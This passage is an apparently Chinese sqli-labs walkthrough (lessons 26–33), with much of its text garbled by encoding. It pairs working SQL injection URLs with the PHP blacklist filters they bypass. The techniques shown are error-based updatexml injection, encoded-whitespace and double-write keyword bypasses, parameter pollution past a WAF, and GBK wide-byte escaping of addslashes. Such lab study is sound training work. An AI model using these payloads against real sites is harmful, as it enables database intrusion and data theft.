(è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥)"></a>Less-26 Trick with comments and space (è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-24"><a href="#æ‰‹åŠ¨æ³¨å…¥-24" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æˆ‘ä»¬å¯ä»¥ç”¨urlç¼–ç è¿›è¡Œç»•è¿‡(è¿™äº›ç¼–ç åœ¨Windowsä¸‹ä½¿ç”¨å¯èƒ½ä¼šå‡ºç°é—®é¢˜)</p><p>%09 Tabé”®ï¼ˆæ°´å¹³ï¼‰<br>%0a æ–°å»ºä¸€è¡Œ<br>%0c æ–°çš„ä¸€é¡µ<br>%0d return é”®<br>%0b Tabé”®ï¼ˆå‚ç›´ï¼‰<br>%a0 ç©ºæ ¼</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-26/?id=1&#x27;anandd(updatexml(1,concat(0x7e,(<span class="attribute">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-24"><a href="#æºç åˆ†æ-24" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šçš„ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-25"><a href="#æ‰‹åŠ¨æ³¨å…¥-25" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ç›²æ³¨å³å¯</p><h4 id="æºç åˆ†æ-25"><a href="#æºç åˆ†æ-25" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-è¿‡æ»¤äº†unionå’Œselectçš„"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-è¿‡æ»¤äº†unionå’Œselectçš„" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (è¿‡æ»¤äº†unionå’Œselectçš„)"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (è¿‡æ»¤äº†unionå’Œselectçš„)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-26"><a href="#æ‰‹åŠ¨æ³¨å…¥-26" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-27/?id=1&#x27;and(uPdatexml(1,conCat(0x7e,(<span class="attribute">selEct</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-26"><a href="#æºç åˆ†æ-26" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-27"><a href="#æ‰‹åŠ¨æ³¨å…¥-27" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼Œç›´æ¥ç›²æ³¨å³å¯</p><h4 id="æºç åˆ†æ-27"><a href="#æºç åˆ†æ-27" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥)"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (åŸºäºé”™è¯¯çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-28"><a href="#æ‰‹åŠ¨æ³¨å…¥-28" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒå†™ç»•è¿‡å³å¯</p><h4 id="æºç åˆ†æ-28"><a href="#æºç åˆ†æ-28" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesisåŸºäºç›²æ³¨çš„ï¼Œæœ‰æ‹¬å·çš„å•å¼•å·å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº†unionå’Œselectç­‰çš„æ³¨å…¥</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-29"><a href="#æ‰‹åŠ¨æ³¨å…¥-29" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åŒå†™ç»•è¿‡å³å¯</p><h4 id="æºç åˆ†æ-29"><a href="#æºç åˆ†æ-29" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-29-åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯"><a href="#Less-29-åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯" class="headerlink" title="Less-29 åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯"></a>Less-29 åŸºäºWAFçš„ä¸€ä¸ªé”™è¯¯</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-30"><a href="#æ‰‹åŠ¨æ³¨å…¥-30" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æ³¨æ„è¦é…å¥½<code>tomcat</code>çš„ç›¸å…³ç¯å¢ƒ</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a>Less-30 Get-Blind Havaing with WAF</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-31"><a href="#æ‰‹åŠ¨æ³¨å…¥-31" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a><strong>Less-31 Protection with WAF</strong></h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-32"><a href="#æ‰‹åŠ¨æ³¨å…¥-32" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 Bypass addslashes()</h3><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><p>mysql åœ¨ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5c å°±æ˜¯ä¸€ä¸ª æ±‰å­—ï¼ˆå‰ä¸€ä¸ª ascii ç å¤§äº 128 æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚æˆ‘ä»¬åœ¨è¿‡æ»¤ â€™ çš„æ—¶å€™ï¼Œå¾€å¾€åˆ©ç”¨çš„æ€ è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º \â€™ ï¼ˆè½¬æ¢çš„å‡½æ•°æˆ–è€…æ€è·¯ä¼šåœ¨æ¯ä¸€å…³é‡åˆ°çš„æ—¶å€™ä»‹ç»ï¼‰ã€‚ å› æ­¤æˆ‘ä»¬åœ¨æ­¤æƒ³åŠæ³•å°† â€˜ å‰é¢æ·»åŠ çš„ \ é™¤æ‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š </p><p>ï¼ˆ1ï¼‰%df åƒæ‰ \ å…·ä½“çš„åŸå› æ˜¯ urlencode(â€˜\) &#x3D; %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27 å‰é¢æ·»åŠ %dfï¼Œå½¢ æˆ%df%5c%27ï¼Œè€Œä¸Šé¢æåˆ°çš„ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤ äº‹%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚</p><p>ï¼ˆ2ï¼‰å°† \â€™ ä¸­çš„ \ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 çš„æƒ…å†µï¼Œåé¢çš„%5c ä¼šè¢«å‰é¢çš„%5c ç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³•</p><h4 id="æ‰‹åŠ¨æ³¨å…¥-33"><a href="#æ‰‹åŠ¨æ³¨å…¥-33" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-32/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-30"><a href="#æºç åˆ†æ-30" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-34"><a href="#æ‰‹åŠ¨æ³¨å…¥-34" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span 